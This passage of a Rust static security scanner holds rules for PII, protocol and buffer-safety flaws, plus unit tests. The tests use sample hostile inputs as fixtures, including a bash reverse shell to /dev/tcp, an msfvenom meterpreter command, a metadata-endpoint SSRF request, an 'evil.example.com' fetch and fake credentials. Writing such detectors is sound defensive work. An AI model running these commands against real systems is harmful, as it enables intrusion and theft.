    }
}

// ── kali-tools-forensics: Data handling security ────────────────────────────

/// Detect data handling issues: PII in logs, sensitive data in error messages.
fn scan_data_handling(body: &str, out: &mut Vec<SecurityFinding>) {
    static PII_PATTERNS: LazyLock<Vec<(&str, Regex)>> = LazyLock::new(|| {
        [
            ("SSN pattern", r"\b\d{3}-\d{2}-\d{4}\b"),
            (
                "Credit card (Visa)",
                r"\b4\d{3}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
            ),
            (
                "Credit card (MC)",
                r"\b5[1-5]\d{2}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
            ),
        ]
        .iter()
        .filter_map(|(name, pat)| Regex::new(pat).ok().map(|re| (*name, re)))
        .collect()
    });

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }

        // PII in source code
        for (name, re) in PII_PATTERNS.iter() {
            if re.is_match(trimmed) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "data_handling".to_owned(),
                    rule_id: "SEC-D01".to_owned(),
                    message: format!("Possible PII in source: {name}"),
                    evidence: Some(redact_secret(trimmed)),
                    line: Some(i + 1),
                    remediation: Some(
                        "Remove PII from source code; use test fixtures with synthetic data"
                            .to_owned(),
                    ),
                    word: None,
                    variant: None,
                });
            }
        }

        // Stack traces / verbose errors exposed to users
        let lower = trimmed.to_ascii_lowercase();
        if (lower.contains("traceback")
            || lower.contains("stack_trace")
            || lower.contains("stacktrace"))
            && (lower.contains("response")
                || lower.contains("render")
                || lower.contains("send")
                || lower.contains("json"))
        {
            out.push(SecurityFinding {
                severity: Severity::Medium,
                category: "data_handling".to_owned(),
                rule_id: "SEC-D02".to_owned(),
                message: "Stack trace exposed in response — information disclosure".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Return generic error messages to users; log details server-side only"
                        .to_owned(),
                ),
                word: None,
                variant: None,
            });
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Suricata-inspired protocol analysis
// ══════════════════════════════════════════════════════════════════════════════

/// Detect protocol-level vulnerabilities: DNS tunneling, HTTP smuggling, buffer/integer overflow.
fn scan_protocol_vulns(body: &str, out: &mut Vec<SecurityFinding>) {
    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }
        let lower = trimmed.to_ascii_lowercase();

        // HTTP request smuggling: Content-Length + Transfer-Encoding together
        if lower.contains("content-length") && lower.contains("transfer-encoding") {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "protocol".to_owned(),
                rule_id: "SEC-R01".to_owned(),
                message:
                    "HTTP request smuggling risk: Content-Length and Transfer-Encoding both present"
                        .to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Use only one of Content-Length or Transfer-Encoding per request".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // Integer overflow in size calculations
        if (lower.contains("as u32")
            || lower.contains("as u16")
            || lower.contains("as u8")
            || lower.contains("(int)")
            || lower.contains("(short)")
            || lower.contains("(byte)"))
            && (lower.contains("size")
                || lower.contains("length")
                || lower.contains("count")
                || lower.contains("offset"))
        {
            out.push(SecurityFinding {
                severity: Severity::Medium,
                category: "protocol".to_owned(),
                rule_id: "SEC-R02".to_owned(),
                message: "Possible integer overflow: narrowing cast on size/length value"
                    .to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Use checked arithmetic or validate range before casting".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // Missing bounds check patterns (C/C++)
        if lower.contains("memcpy(")
            || lower.contains("strcpy(")
            || lower.contains("strcat(")
            || lower.contains("sprintf(")
            || lower.contains("gets(")
        {
            out.push(SecurityFinding {
                severity: Severity::High,
                category: "protocol".to_owned(),
                rule_id: "SEC-R03".to_owned(),
                message: "Unsafe buffer operation — no bounds checking".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Use bounded variants: memcpy_s, strncpy, snprintf, fgets".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }

        // DNS tunneling: very long domain name or TXT record abuse
        if lower.contains("dns")
            && lower.contains("txt")
            && (lower.contains("query") || lower.contains("record") || lower.contains("lookup"))
        {
            out.push(SecurityFinding {
                severity: Severity::Medium,
                category: "protocol".to_owned(),
                rule_id: "SEC-R04".to_owned(),
                message: "DNS TXT record usage — potential data exfiltration channel".to_owned(),
                evidence: Some(trimmed.to_owned()),
                line: Some(i + 1),
                remediation: Some(
                    "Monitor and restrict DNS TXT record queries; use DNS filtering".to_owned(),
                ),
                word: None,
                variant: None,
            });
        }
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Heuristic: is this line a comment?
fn is_comment(line: &str, _language: &str) -> bool {
    let t = line.trim_start();
    t.starts_with("//")
        || t.starts_with('#')
        || t.starts_with("/*")
        || t.starts_with('*')
        || t.starts_with("--")
        || t.starts_with("rem ")
        || t.starts_with("REM ")
}

/// Check if a line contains a string literal value (not just a variable reference).
fn has_string_literal_value(line: &str) -> bool {
    // Look for quoted strings after = or :
    if let Some(pos) = line.find('=') {
        let after = &line[pos + 1..];
        let trimmed = after.trim();
        if trimmed.starts_with('"') || trimmed.starts_with('\'') {
            // Not empty string
            return trimmed.len() > 2;
        }
    }
    if let Some(pos) = line.find(':') {
        let after = &line[pos + 1..];
        let trimmed = after.trim();
        if trimmed.starts_with('"') || trimmed.starts_with('\'') {
            return trimmed.len() > 2;
        }
    }
    false
}

/// Redact the value part of a secret assignment for safe display.
fn redact_secret(line: &str) -> String {
    let mut result = line.to_owned();
    if result.len() > 80 {
        result.truncate(80);
        result.push_str("...[REDACTED]");
    }
    result
}

// ══════════════════════════════════════════════════════════════════════════════
// Tests
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use nom_ast::Span;
    use nom_resolver::{Resolver, WordEntry};

    fn span() -> Span {
        Span::new(0, 1, 1, 1)
    }

    fn setup() -> Resolver {
        let r = Resolver::open_in_memory().unwrap();
        r.upsert(&WordEntry {
            word: "weak_hash".to_owned(),
            security: 0.2,
            performance: 0.5,
            reliability: 0.9,
            ..WordEntry::default()
        })
        .unwrap();
        r.upsert(&WordEntry {
            word: "good_hash".to_owned(),
            security: 0.95,
            performance: 0.8,
            reliability: 0.99,
            ..WordEntry::default()
        })
        .unwrap();
        r.upsert(&WordEntry {
            word: "cve_hash".to_owned(),
            security: 0.9,
            performance: 0.8,
            reliability: 0.99,
            hash: Some("CVE-2024-12345".to_owned()),
            ..WordEntry::default()
        })
        .unwrap();
        r
    }

    fn make_source_with_need(word: &str) -> SourceFile {
        use nom_ast::*;
        SourceFile {
            path: None,
            locale: None,
            declarations: vec![Declaration {
                classifier: Classifier::Flow,
                name: Identifier::new("test", span()),
                statements: vec![Statement::Need(NeedStmt {
                    reference: NomRef {
                        word: Identifier::new(word, span()),
                        variant: None,
                        span: span(),
                    },
                    constraint: None,
                    span: span(),
                })],
                span: span(),
            }],
        }
    }

    // ── Program-level tests ──────────────────────────────────────────────

    #[test]
    fn passes_for_good_word() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("good_hash");
        let report = checker.check(&source).unwrap();
        assert!(report.passed);
        assert!(report.findings.is_empty());
    }

    #[test]
    fn fails_for_weak_security() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("weak_hash");
        let report = checker.check(&source).unwrap();
        assert!(!report.passed);
        assert!(report.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn detects_cve() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("cve_hash");
        let report = checker.check(&source).unwrap();
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.severity == Severity::Critical)
        );
    }

    // ── Body scanning tests ─────────────────────────────────────────────

    #[test]
    fn detect_sql_injection() {
        let body = r#"
            let query = "SELECT * FROM users WHERE id=" + user_input;
        "#;
        let findings = scan_body(body, "javascript");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "injection" && f.severity == Severity::Critical),
            "Should detect SQL injection: {findings:?}"
        );
    }

    #[test]
    fn detect_hardcoded_password() {
        let body = r#"
            password = "super_secret_123"
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "secrets" && f.severity >= Severity::High),
            "Should detect hardcoded password: {findings:?}"
        );
    }

    #[test]
    fn detect_reverse_shell() {
        let body = r#"
            bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        "#;
        let findings = scan_body(body, "bash");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "payload" && f.severity == Severity::Critical),
            "Should detect reverse shell: {findings:?}"
        );
    }

    #[test]
    fn detect_weak_crypto_md5() {
        let body = r#"
            import hashlib
            h = hashlib.md5(password.encode())
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "crypto" && f.severity >= Severity::High),
            "Should detect MD5 for password hashing: {findings:?}"
        );
    }

    #[test]
    fn detect_api_key_leak() {
        let body = r#"
            api_key = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "secrets"),
            "Should detect GitHub PAT: {findings:?}"
        );
    }

    #[test]
    fn clean_code_no_findings() {
        let body = r#"
            fn add(a: i32, b: i32) -> i32 {
                a + b
            }
        "#;
        let findings = scan_body(body, "rust");
        // Filter out Info-level findings
        let real_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.severity > Severity::Info)
            .collect();
        assert!(
            real_findings.is_empty(),
            "Clean code should have no findings above Info: {real_findings:?}"
        );
    }

    #[test]
    fn security_score_calculation() {
        // No findings = perfect score
        assert_eq!(security_score(&[]), 1.0);

        // One critical = heavy penalty
        let critical = vec![SecurityFinding {
            severity: Severity::Critical,
            category: "test".to_owned(),
            rule_id: "TEST-001".to_owned(),
            message: "test".to_owned(),
            evidence: None,
            line: None,
            remediation: None,
            word: None,
            variant: None,
        }];
        let score = security_score(&critical);
        assert!(
            score < 0.7,
            "Critical finding should reduce score below 0.7, got {score}"
        );
        assert!(score > 0.0, "Single critical should not zero out score");

        // Multiple findings stack
        let multiple = vec![
            SecurityFinding {
                severity: Severity::Critical,
                category: "test".to_owned(),
                rule_id: "TEST-001".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
            SecurityFinding {
                severity: Severity::High,
                category: "test".to_owned(),
                rule_id: "TEST-002".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
            SecurityFinding {
                severity: Severity::High,
                category: "test".to_owned(),
                rule_id: "TEST-003".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
        ];
        let stacked = security_score(&multiple);
        assert!(stacked < score, "More findings should lower score");
    }

    #[test]
    fn severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::Info);
    }

    #[test]
    fn detect_pickle_deserialization() {
        let body = "data = pickle.loads(user_input)";
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "deserialization" && f.severity == Severity::Critical),
            "Should detect pickle.loads: {findings:?}"
        );
    }

    #[test]
    fn detect_xss_innerhtml() {
        let body = r#"element.innerHTML = userInput;"#;
        let findings = scan_body(body, "javascript");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "xss" && f.severity == Severity::High),
            "Should detect innerHTML XSS: {findings:?}"
        );
    }

    #[test]
    fn detect_insecure_tls() {
        let body = r#"requests.get(url, verify=False)"#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "config" && f.severity == Severity::High),
            "Should detect disabled TLS verification: {findings:?}"
        );
    }

    #[test]
    fn detect_private_key() {
        let body = r#"
            key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow..."
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "secrets" && f.severity == Severity::Critical),
            "Should detect embedded private key: {findings:?}"
        );
    }

    #[test]
    fn detect_msfvenom_payload() {
        let body = "payload = msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1";
        let findings = scan_body(body, "bash");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "payload" && f.severity == Severity::Critical),
            "Should detect msfvenom payload: {findings:?}"
        );
    }

    // ── TruffleHog-grade secret detection tests ────────────────────────

    #[test]
    fn detect_aws_access_key_regex() {
        let body = r#"aws_key = "AKIAIOSFODNN7EXAMPLE""#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC-S01"),
            "Should detect AWS Access Key via regex: {findings:?}"
        );
    }

    #[test]
    fn detect_jwt_token() {
        let body = "token = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U\"";
        let findings = scan_body(body, "javascript");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC-S38"),
            "Should detect JWT token: {findings:?}"
        );
    }

    #[test]
    fn detect_mongodb_connection_string() {
        let body = r#"uri = "mongodb+srv://admin:secret@cluster0.example.net/db""#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC-S34"),
            "Should detect MongoDB connection string: {findings:?}"
        );
    }

    // ── Kali-category scanner tests ────────────────────────────────────

    #[test]
    fn detect_ssrf_internal_ip() {
        let body = r#"resp = requests.get("http://169.254.169.254/latest/meta-data/")"#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "web" && f.rule_id == "SEC-W01"),
            "Should detect SSRF to metadata endpoint: {findings:?}"
        );
    }

    #[test]
    fn detect_credentials_in_url() {
        let body = r#"db = connect("postgres://admin:p4ssw0rd@db.prod.internal:5432/mydb")"#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "credential" && f.rule_id == "SEC-K01"),
            "Should detect credentials in URL: {findings:?}"
        );
    }

    #[test]
    fn detect_shell_true_subprocess() {
        let body = r#"subprocess.run(cmd, shell=True)"#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "execution" && f.rule_id == "SEC-E01"),
            "Should detect shell=True: {findings:?}"
        );
    }

    #[test]
    fn detect_weak_tls_version() {
        let body = r#"ctx.minimum_version = ssl.PROTOCOL_TLSv1"#;
        let findings = scan_body(body, "python");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "network" && f.rule_id == "SEC-N01"),
            "Should detect weak TLS version: {findings:?}"
        );
    }

    #[test]
    fn detect_unsafe_buffer_ops() {
        let body = r#"strcpy(dest, src);"#;
        let findings = scan_body(body, "c");
        assert!(
            findings
                .iter()
                .any(|f| f.category == "protocol" && f.rule_id == "SEC-R03"),
            "Should detect unsafe buffer operation: {findings:?}"
        );
    }

    // ── Guardrails tests ───────────────────────────────────────────────

    #[test]
    fn guardrails_blocked_domain() {
        let guardrails = Guardrails {
            blocked_domains: vec!["evil.example.com".to_owned()],
            ..Default::default()
        };
        let source = "fetch https://evil.example.com/data";
        let findings = check_guardrails(source, &guardrails);
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC-G01"),
            "Should detect blocked domain: {findings:?}"
        );
    }

    #[test]
    fn guardrails_banned_word() {
        let guardrails = Guardrails {
            banned_words: vec!["rm_rf".to_owned()],
            ..Default::default()
        };
        let source = "use rm_rf";
        let findings = check_guardrails(source, &guardrails);
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC-G03"),
            "Should detect banned word: {findings:?}"
        );
    }
}
